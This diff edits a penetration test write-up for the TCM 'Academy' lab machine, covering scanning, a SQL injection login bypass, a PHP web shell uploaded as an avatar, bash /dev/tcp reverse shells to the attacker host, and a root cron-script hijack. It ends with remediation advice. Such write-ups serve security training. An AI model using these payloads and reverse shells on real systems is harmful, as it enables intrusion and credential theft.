@@ -1,231 +1,190 @@
-
 # TCM Academy Machine - Penetration Test Report
 
 Author: Daniel Struble  
-Date: 01-11-26
-Target: Through service fingerprinting and enumeration, the server was determined to be a Debian Linux host running Apache, PHP, and MySQL
-
----
+Date: 01-11-2026  
+Target Summary: Through service fingerprinting and enumeration, the server was determined to be a Debian Linux host running Apache, PHP, and MariaDB hosting a custom application (“Academy”).
 
 ## 1. Executive Summary
 
-This engagement simulated how an external attacker could compromise the target environment and escalate to full system control.
+This was a black-box test against a single Linux target. Only the IP was known in advance.
 
-The attack path:
+Attack chain summary:
 
-1. Enumerate exposed services.
-2. Identify an online course web application and phpMyAdmin instance.
-3. Abuse insecure file upload functionality to obtain remote code execution as `www-data`.
-4. Use a scheduled cron job and weak file permission model to escalate first to user `grimmie`, then to `root`.
-5. Loot system files, database contents, and configuration data.
+1. Enumerated open services.
+2. Discovered /academy application and phpMyAdmin directory.
+3. Bypassed login via SQL injection.
+4. Uploaded a PHP web shell through an insecure avatar upload function.
+5. Gained remote code execution as www-data.
+6. Found a root-executed cron job pointing to /home/grimmie/backup.sh.
+7. Overwrote that script because the directory was writable.
+8. Inserted a reverse shell payload.
+9. Waited for cron to execute it as root, obtaining full system compromise.
 
-**Summary:**  
-I started from the outside, looked at what the server was offering to the internet, found a poorly protected website and database admin panel, snuck in using a “fake image” that was actually code, then used bad automation scripts and permissions to climb from a low-privileged web user all the way up to full system control.
-
----
+Plain-language version:  
+I scanned the machine, found a weak website, tricked the login with SQL injection, uploaded code disguised as an image, and rewrote a system script the computer ran automatically as root. That script called back to me and gave me full control.
 
 ## 2. Scope and Objectives
 
-**Technical / Test Objectives**
+Technical objectives:
+- Identify exposed services.
+- Test them for vulnerabilities.
+- Achieve remote code execution if possible.
+- Escalate privileges to root.
+- Extract sensitive data as proof of compromise.
 
-- Identify exposed network services and web applications.
-- Determine whether those services are vulnerable to exploitation.
-- Attempt to obtain remote code execution on the system.
-- Attempt to escalate to local privilege escalation and obtain root.
-- Enumerate and exfiltrate sensitive data where possible.
-- Find flag, if one exists.
-
-**Summary:**  
-This was not an engagement with any pre-defined scope. That said, I just made it my goal to see what the server was exposing, figure out if any of it was weak, use that weakness to break in, then see how far I could climb until I completely owned the machine and its data.
-
----
+Plain version:  
+The goal was: find a way in, climb to root, and show the risks with evidence.
 
 ## 3. Reconnaissance and Enumeration
 
 ### 3.1 Network Scan (Initial Discovery)
 
-This engagement began as a **black-box assessment**, with only a single target IP address provided. No prior knowledge of operating system, application stack, exposed interfaces, or authentication was assumed.
+Command used:  
+nmap -sS -sV -O -p- 192.168.245.143
 
-An initial TCP port sweep was performed using Metasploit’s Nmap wrapper, which also populated the Metasploit database for later use:
+Scan results:
 
+- Port 21/tcp open ftp vsftpd 3.0.3  
+- Port 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2  
+- Port 80/tcp open http Apache 2.4.38 (Debian)
 
-### Scan Results
+OS fingerprinting:
+- Linux kernel in the 4.x–5.x family
+- VMware virtual machine detected
 
-The scan returned three open TCP services:
-
-| Port | State | Service | Version |
-|------|-------|---------|---------|
-| 21/tcp | open | ftp | vsftpd 3.0.3 |
-| 22/tcp | open | ssh | OpenSSH 7.9p1 Debian 10+deb10u2 |
-| 80/tcp | open | http | Apache httpd 2.4.38 (Debian) |
-
-Additional OS fingerprinting from Nmap indicated:
-
-- Likely Linux kernel **4.x–5.x**
-- General-purpose Linux host
-- MAC vendor: VMware (indicating virtualization)
-
-### Interpretation
-
-At this initial stage **no application details were known**. The scan did **not** show:
-
-- any MySQL port exposed
-- any phpMyAdmin interface
-- any CMS indicators
-- any custom application endpoints
-
-The only confirmed information after scanning:
-
-- FTP is running but likely anonymous-disabled
-- SSH is present but brute force would be inefficient and noisy
-- HTTP is the only attack surface with meaningful exploration potential
-
-### Summary
-
-From the outside, the server only showed FTP, SSH, and a basic website. Nothing looked obviously vulnerable yet. That meant deeper web enumeration would be required to discover what the site actually did and whether it hid any administrative functionality.
-
----
+Interpretation:  
+SSH and FTP showed nothing useful immediately. HTTP was the best target.
 
 ### 3.2 Web Enumeration
 
-Initial browsing of `http://192.168.245.143` displayed the default Apache2 Debian installation page, confirming that the web server was running but not yet configured to hide default content.
+Initial browsing displayed Apache’s default Debian welcome page.
 
-**Evidence:**  
-- Screenshot: Apache2 Default Page
+### 3.2.1 Gobuster Scan #1
 
----
-
-### 3.2.1 Gobuster Directory Enumeration (Round 1)
-
-A first directory scan was performed using `common.txt`:
-
-    gobuster dir -u http://192.168.245.143 -w /usr/share/wordlists/dirb/common.txt
-
-**Findings:**
-
-| Path            | Status | Meaning                                                |
-|-----------------|--------|--------------------------------------------------------|
-| /.htpasswd      | 403    | Forbidden (protected credential file)                 |
-| /.htaccess      | 403    | Forbidden (Apache configuration file)                 |
-| /.hta           | 403    | Forbidden (Apache hardening file)                     |
-| /index.html     | 200    | Default Apache landing page present                   |
-| /phpmyadmin     | 301    | Redirects to `/phpmyadmin/` login page                |
-| /server-status  | 403    | `mod_status` enabled but restricted                   |
-
-**Interpretation:**  
-Gobuster essentially showed a default Apache site. The only meaningful discovery was the exposed `/phpmyadmin` directory, which is a high-risk entry point because it often leads to database access or misconfigurations attackers can exploit.
-
-
----
-
-### 3.2.2 phpMyAdmin Login Page
-
-Browsing to:
-
-    http://192.168.245.143/phpmyadmin/
-
-revealed a standard phpMyAdmin login panel. PMA version 4.9.7 was confirmed through inspection of extracted source code.
-
-**Evidence:**  
-- Screenshot: phpMyAdmin login page  
-- Screenshot: Page source showing `$cfg['Servers'][$i]['auth_type'] = 'cookie';`
-
-**Interpretation:**  
-Authentication is cookie-based and requires valid credentials. No default credentials succeeded, and no SQL injection was evident on the login form.
-
----
-
-### 3.2.3 Gobuster Directory Enumeration (Round 2 – Medium Wordlist)
-
-A second enumeration was run with a larger wordlist:
-
-    gobuster dir -u http://192.168.245.143 \
-      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-      -t 50 -q -o academy-gobuster.txt
+Wordlist used: dirb/common.txt
 
 Findings:
+- /.htpasswd (403)
+- /.htaccess (403)
+- /.hta (403)
+- /index.html (200)
+- /phpmyadmin (301 redirect)
+- /server-status (403)
 
-| Path      | Status | Meaning |
-|-----------|--------|---------|
-| /academy  | 301    | Redirect to web application |
-| /phpmyadmin | 302 | Confirmed again |
-| /server-status | 403 | Restricted |
+Interpretation:  
+phpMyAdmin exposure was the only interesting result.
 
-**Interpretation:**  
-The `/academy` directory is the real web application, not the Apache default placeholder.
+### 3.2.2 phpMyAdmin interface
 
----
+Accessing /phpmyadmin showed a login page requiring credentials. Default logins failed.
 
-### 3.2.4 Accessing `/academy`
+### 3.2.3 Gobuster Scan #2 (Medium wordlist)
 
-Using:
+Found:
+- /academy (301 redirect)
 
-    curl -I http://192.168.245.143/academy/index.php
+### 3.2.4 /academy application
 
-returned:
+Accessing /academy/index.php revealed an online course registration system with a Reg No + Password login.
 
-- HTTP 200 OK  
-- Apache/2.4.38  
-- PHP session cookie being set
+### 3.2.5 SQL Injection Authentication Bypass
 
-Loading the page in a browser revealed a **student login portal** belonging to an **Online Course Registration System**.
+Payload used:  
+' OR '1'='1
 
-**Evidence:**  
-- Screenshot: Student Login page  
-- Shows fields: Reg No + Password
+This bypassed authentication entirely.
 
----
+Interpretation:  
+The SQL query was unsafely concatenating user input.
 
-### 3.2.5 Authentication Bypass Using SQL Injection
+### 3.2.6 Insecure File Upload
 
-Submitting a basic SQLi payload:
+On the profile edit page, the avatar upload form allowed arbitrary file types. PHP files were accepted and stored in /academy/studentphoto/ without validation.
 
-    ' OR '1'='1
+This allowed uploading a PHP web shell.
 
-bypassed the login form and granted access to a student dashboard.
+## 4. Exploitation
 
-**Evidence:**  
-- Screenshot: Successful login redirection  
-- Screenshot: Password change form displayed immediately afterward
+### 4.1 Web Shell Upload
 
-**Interpretation:**  
-This confirms a **critical SQL injection vulnerability** in the authentication logic.  
-Instead of validating input, the backend simply concatenates text into a database query.
+A minimal PHP system-execution shell was uploaded (<?php system($_GET['cmd']); ?>). Visiting it with a cmd parameter returned command execution as user www-data.
 
----
+### 4.2 Reverse Shell
 
-### 3.2.6 File Upload Vulnerability Discovery
+A bash TCP reverse shell was executed via:  
+bash -c 'bash -i >& /dev/tcp/192.168.245.131/4444 0>&1'
 
-Navigating to:
+The attacker's listener received an interactive www-data shell.
 
-    /academy/my-profile.php
+## 4.3 Privilege Escalation: www-data -> root
 
-revealed a user profile edit page containing a **photo upload** input field.
+Inspection of /etc/crontab revealed:
 
-Uploading a PHP file with embedded system execution:
+\* \* \* \* \* root /home/grimmie/backup.sh
 
-```php
-<?php system($_GET['cmd']); ?>
+This means:
+- The script ran every minute
+- It ran as root
+- It lived in a user home directory
+- The directory was writable by www-data
 
----
+Directory permissions confirmed:
 
-## 4. Exploiting the Web Application
+drwxrwxrwx 3 grimmie administrator 4096 Dec 14 17:28 /home/grimmie
 
-### 4.1 Insecure File Upload
+Because www-data had write access, the contents of backup.sh were replaced with a reverse shell payload:
 
-Within the Academy application, a student profile feature allowed the upload of an avatar image.  
-Testing showed:
+#!/bin/bash  
+bash -i >& /dev/tcp/192.168.245.131/8080 0>&1
 
-- The application accepted files with `.php` content masquerading as images.
-- There was no effective server-side validation of file type or content.
+Within 60 seconds, cron executed the modified script as root, opening a root shell on the attacker machine.
 
-A simple PHP web shell was created and uploaded:
+Result:  
+root@academy:~# id  
+uid=0(root) gid=0(root)
 
-```php
-<?php
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
-?>
+## 5. Post-Exploitation
 
+### 5.1 Database Credential Recovery
 
+From the application config file:
+- DB user: grimmie
+- DB password: [REDACTED]
+- Database name: onlinecourse
+
+These credentials allowed access to the MariaDB instance. Inside the database, plaintext or weakly hashed student and admin credentials were found.
+
+### 5.2 File and System Loot
+
+Extracted:
+- /etc/passwd
+- /etc/shadow
+- Web root (/var/www/html)
+- Database dumps
+- Configuration files
+
+### 5.3 Flag Extraction
+
+The root flag was found at /root/flag.txt.
+
+## 6. Findings Summary
+
+Critical findings:
+- SQL injection in login form
+- Arbitrary file upload leading to RCE
+- World-writable user home directory
+- Root cron job executing user-writable script
+- Exposed phpMyAdmin
+
+Impact:  
+Full system compromise from unauthenticated user to root.
+
+## 7. Remediation Recommendations
+
+- Fix SQL injection using prepared statements
+- Perform strict server-side file validation
+- Remove world-writable directory permissions
+- Restrict cron jobs to root-owned, root-writable paths only
+- Restrict phpMyAdmin to authorized IPs
+- Enforce strong credential storage and password hashing
+- Regularly audit file permissions
